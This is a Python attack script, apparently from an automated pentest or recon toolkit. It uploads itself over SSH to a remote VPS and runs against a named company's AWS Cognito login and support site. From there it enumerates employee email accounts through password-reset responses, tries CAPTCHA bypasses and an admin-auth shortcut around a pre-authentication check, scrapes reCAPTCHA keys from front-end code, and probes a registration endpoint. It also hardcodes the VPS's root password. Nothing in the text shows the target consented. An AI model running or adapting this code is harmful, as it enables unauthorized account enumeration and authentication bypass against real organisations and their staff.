"""QA user enum via ForgotPassword + SRP with captcha bypass attempts."""
import paramiko, textwrap

VPS = "216.238.75.117"
PW = r"]Aq9mngH(_%ZV%jn"

REMOTE = textwrap.dedent(r'''
import json, urllib.request, urllib.error, ssl, time, hashlib, hmac, os

ctx = ssl._create_unverified_context()

def cognito(target, body):
    data = json.dumps(body).encode()
    r = urllib.request.Request("https://cognito-idp.us-east-2.amazonaws.com/",
        data=data,
        headers={
            "Content-Type": "application/x-amz-json-1.1",
            "X-Amz-Target": f"AWSCognitoIdentityProviderService.{target}",
            "User-Agent": "Mozilla/5.0"
        })
    try:
        resp = urllib.request.urlopen(r, timeout=20, context=ctx)
        return resp.status, resp.read(), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read(), dict(e.headers)
    except Exception as e:
        return 0, str(e).encode(), {}

QA_CLIENT = "cavifd298a9olegm3j0o1jnnp"
PROD_CLIENT = "4fjbm9cornhgfqk4o8m33rjt2f"

# ======================================================
print("=" * 60)
print("1. USER ENUM VIA FORGOTPASSWORD — QA vs PROD")
print("=" * 60)

emails = [
    # Known from IntelX/OSINT
    "admin@disperso.com",
    "sales@disperso.com",
    "contacto@disperso.com",
    "soporte@disperso.com",
    "info@disperso.com",
    # Tuxpan emails
    "casep@disperso.com",
    "fcatrin@disperso.com",
    "garate@disperso.com",
    "maureira@disperso.com",
    "maurro@disperso.com",
    "mfiguerc@disperso.com",
    "mmoossen@disperso.com",
    "mnavea@disperso.com",
    "smacias@disperso.com",
    # Variations
    "dev@disperso.com",
    "test@disperso.com",
    "qa@disperso.com",
    "staging@disperso.com",
    "demo@disperso.com",
    # Obviously fake (control)
    "xyzfake12345@disperso.com",
    "notexist999@disperso.com",
]

print("\n--- QA Pool ---")
qa_results = {}
for email in emails:
    s, b, h = cognito("ForgotPassword", {"ClientId": QA_CLIENT, "Username": email})
    msg = b.decode(errors="replace")
    result = json.loads(msg) if msg.startswith("{") else {"raw": msg}
    exists = "CodeDeliveryDetails" in msg
    mask = result.get("CodeDeliveryDetails", {}).get("Destination", "none") if exists else "N/A"
    err = result.get("__type", "N/A") if not exists else "N/A"
    qa_results[email] = {"status": s, "exists": exists, "mask": mask, "error": err}
    tag = "EXISTS" if exists else f"  {err}"
    print(f"  {email}: {s} -> {tag} [{mask}]")
    time.sleep(0.5)

print(f"\n  QA EXISTING: {sum(1 for v in qa_results.values() if v['exists'])}/{len(emails)}")

print("\n--- PROD Pool (control) ---")
# Test same emails on prod to compare behavior
for email in ["admin@disperso.com", "xyzfake12345@disperso.com"]:
    s, b, h = cognito("ForgotPassword", {"ClientId": PROD_CLIENT, "Username": email})
    msg = b.decode(errors="replace")
    print(f"  {email}: {s} -> {msg[:200]}")
    time.sleep(0.5)

# ======================================================
print("\n\n" + "=" * 60)
print("2. SRP AUTH WITH CAPTCHA BYPASS ATTEMPTS")
print("=" * 60)

# The Lambda checks ValidationData.captcha
# Try different bypass methods

attempts = [
    # Regular with dummy captcha
    {"AuthFlow": "USER_SRP_AUTH", "ClientId": QA_CLIENT,
     "AuthParameters": {"USERNAME": "admin@disperso.com", "SRP_A": "a" * 512},
     "ClientMetadata": {"captcha": "bypass"}},
    
    # Empty captcha
    {"AuthFlow": "USER_SRP_AUTH", "ClientId": QA_CLIENT,
     "AuthParameters": {"USERNAME": "admin@disperso.com", "SRP_A": "a" * 512},
     "ClientMetadata": {"captcha": ""}},
    
    # With validation data
    {"AuthFlow": "USER_SRP_AUTH", "ClientId": QA_CLIENT,
     "AuthParameters": {"USERNAME": "admin@disperso.com", "SRP_A": "a" * 512,
                         "DEVICE_KEY": ""},
     "ClientMetadata": {"captcha": "test_token_123"}},
    
    # Without any metadata
    {"AuthFlow": "USER_SRP_AUTH", "ClientId": QA_CLIENT,
     "AuthParameters": {"USERNAME": "admin@disperso.com", "SRP_A": "a" * 512}},
    
    # With "ValidationData" as parameter (Cognito SDK does this)
    {"AuthFlow": "USER_SRP_AUTH", "ClientId": QA_CLIENT,
     "AuthParameters": {"USERNAME": "admin@disperso.com", "SRP_A": "a" * 512},
     "ClientMetadata": {"captcha": "03ANYolq" + "a" * 200}},
]

for i, body in enumerate(attempts):
    s, b, h = cognito("InitiateAuth", body)
    msg = b[:300].decode(errors="replace")
    print(f"\n  Attempt {i+1}: {s}")
    print(f"  Body keys: {list(body.get('ClientMetadata', {}).keys())}")
    print(f"  Response: {msg}")
    time.sleep(1)

# ======================================================
print("\n\n" + "=" * 60)
print("3. ADMIN INITIATE AUTH (bypass PreAuth Lambda)")
print("=" * 60)

# AdminInitiateAuth doesn't trigger PreAuthentication Lambda in some configs
s, b, h = cognito("AdminInitiateAuth", {
    "UserPoolId": "us-east-2_MAvWIdHjw",
    "ClientId": QA_CLIENT,
    "AuthFlow": "ADMIN_USER_PASSWORD_AUTH",
    "AuthParameters": {
        "USERNAME": "admin@disperso.com",
        "PASSWORD": "test123"
    }
})
print(f"  AdminInitiateAuth: {s} {b[:300].decode(errors='replace')}")

# ======================================================
print("\n\n" + "=" * 60)
print("4. QA RECAPTCHA SITE KEY EXTRACTION")
print("=" * 60)

# Get the QA frontend login page and extract reCAPTCHA key
import urllib.request
s, b, h = urllib.request.urlopen(
    urllib.request.Request("https://frontend.qa.disperso.com/",
        headers={"User-Agent": "Mozilla/5.0"}),
    timeout=20, context=ctx
).status, b, {}
try:
    resp = urllib.request.urlopen(
        urllib.request.Request("https://frontend.qa.disperso.com/",
            headers={"User-Agent": "Mozilla/5.0"}),
        timeout=20, context=ctx
    )
    html = resp.read().decode(errors="replace")
    # Find reCAPTCHA key
    import re
    keys = re.findall(r'recaptcha/api\.js\?[^"]*', html)
    print(f"  reCAPTCHA in HTML: {keys}")
    
    # Check the JS bundle for site key
    resp2 = urllib.request.urlopen(
        urllib.request.Request("https://frontend.qa.disperso.com/js/index.d28fb291.js",
            headers={"User-Agent": "Mozilla/5.0"}),
        timeout=30, context=ctx
    )
    js = resp2.read().decode(errors="replace")
    
    # Extract reCAPTCHA site keys
    recaptcha_keys = re.findall(r'6L[a-zA-Z0-9_-]{38}', js)
    print(f"  reCAPTCHA keys in JS: {list(set(recaptcha_keys))}")
    
    # Also check for any environment-specific config
    env_config = re.findall(r'VITE_[A-Z_]+=\S+', js)
    if not env_config:
        env_config = re.findall(r'VITE_[A-Z_]+', js)
    print(f"  VITE_ vars: {list(set(env_config))[:10]}")
    
    # Find captcha/recaptcha context
    captcha_ctx = re.findall(r'.{0,80}captcha.{0,80}', js, re.IGNORECASE)
    for cc in captcha_ctx[:5]:
        print(f"  captcha ctx: {cc.strip()[:150]}")
    
    # Find grecaptcha
    grecaptcha = re.findall(r'.{0,80}grecaptcha.{0,80}', js, re.IGNORECASE)
    for gc in grecaptcha[:5]:
        print(f"  grecaptcha: {gc.strip()[:150]}")
    
except Exception as e:
    print(f"  Error: {e}")

# ======================================================
print("\n\n" + "=" * 60)
print("5. SOPORTE.DISPERSO.COM — REGISTER ENDPOINT")
print("=" * 60)

# From phase 3, /api/v1/auth/register returned 401 (exists!)
# Try different payloads
for payload in [
    {"email": "qatest@yopmail.com", "password": "QaTest2026!Sec", "name": "QA Test"},
    {"username": "qatest@yopmail.com", "password": "QaTest2026!Sec"},
    {},
]:
    try:
        r = urllib.request.Request("https://soporte.disperso.com/api/v1/auth/register",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
        resp = urllib.request.urlopen(r, timeout=15, context=ctx)
        body = resp.read()
        print(f"  POST register: {resp.status} {body[:200].decode(errors='replace')}")
    except urllib.error.HTTPError as e:
        body = e.read()
        print(f"  POST register: {e.code} {body[:200].decode(errors='replace')}")
    except Exception as e:
        print(f"  POST register: ERROR {e}")
    time.sleep(1)

print("\n" + "=" * 60)
print("DONE")
print("=" * 60)
''')

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect(VPS, username="root", password=PW, timeout=15)
sftp = ssh.open_sftp()
with sftp.file("/tmp/qa_enum_srp.py", "w") as f:
    f.write(REMOTE)
sftp.close()
print(f"Connected {VPS}, running QA enum + SRP...")
stdin, stdout, stderr = ssh.exec_command("python3 /tmp/qa_enum_srp.py 2>&1", timeout=180)
out = stdout.read().decode(errors="replace")
with open(r"c:\xampp\htdocs\pentagi\disperso_recon\qa_enum_srp_results.txt", "w", encoding="utf-8", errors="replace") as f:
    f.write(out)
print(out)
ssh.close()
